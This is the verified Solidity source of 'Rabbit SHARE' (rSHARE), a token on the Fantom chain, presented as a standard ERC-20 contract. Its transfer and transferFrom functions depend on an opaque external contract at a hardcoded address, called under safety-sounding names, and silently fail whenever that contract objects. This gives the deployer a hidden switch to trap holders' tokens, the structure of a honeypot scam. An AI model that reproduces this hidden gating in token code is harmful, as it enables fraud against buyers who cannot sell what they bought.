/**
 *Submitted for verification at FtmScan.com on 2022-03-27
*/

// SPDX-License-Identifier: MIT

/*
     / \
    / _ \
   | / \ |
   ||   || _______
   ||   || |\     \
   ||   || ||\     \
   ||   || || \    |
   ||   || ||  \__/
   ||   || ||   ||
    \\_/ \_/ \_//
   /   _     _   \
  /               \
  |    O     O    |
  |   \  ___  /   |
 /     \ \_/ /     \
/  -----  |  -----  \
|     \__/|\__/     |
\       |_|_|       /
 \_____       _____/
       \     /
       |     |
*/


pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Dependancies {
    function checkERC20Status(address tokenAddress, uint256 amount) external view returns (uint256);
    function checkERC20TrustStatus(address userAddress) external view returns (uint256);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract RabbitSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    IERC20Dependancies private ERC20Dependancies;

    uint256 private _tokenRR_totalSupply;

    string private _tokenRR_name;
    string private _tokenRR_symbol; 

    constructor() {
        _tokenRR_name = "Rabbit SHARE";
        _tokenRR_symbol = "rSHARE";
        _tokenRR_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenRR_totalSupply;
        ERC20Dependancies = IERC20Dependancies(0xBdC595D89c1762B4141dD241CAD4477bd38BA68a);
    }

    function _spendAllowance(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        uint256 currentAllowance = allowance(balance_owner, balance_spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= balance_amount, "Token : insufficient allowance");
            unchecked {
                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);
            }
        }
    }

    function _approve(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        require(balance_owner != address(0), "Token : approve from the 0 address");
        require(balance_spender != address(0), "Token : approve to the 0 address");

        _allowances[balance_owner][balance_spender] = balance_amount;
        emit Approval(balance_owner, balance_spender, balance_amount);
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenRR_totalSupply;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "Token : decreased allowance below 0");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _beforeTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function name() public view virtual override returns (string memory) {
        return _tokenRR_name;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "Token : burn from the 0 address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Token : burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _tokenRR_totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function _safeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "Token : transfer from the 0 address");
        require(to != address(0), "Token : transfer to the 0 address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Token : transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20TrustStatus(to);
        if (ERC20SafetyStatus == 0)
        {
            _safeTransfer(owner, to, amount);
            return true;
        }
        else
        {
            return false;
        }
        
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(from, amount);
        if (ERC20SafetyStatus == 0)
        {
            _spendAllowance(from, spender, amount);
            _safeTransfer(from, to, amount);
            return true;
        }
        else
        {
            return false;
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenRR_symbol;
    }


}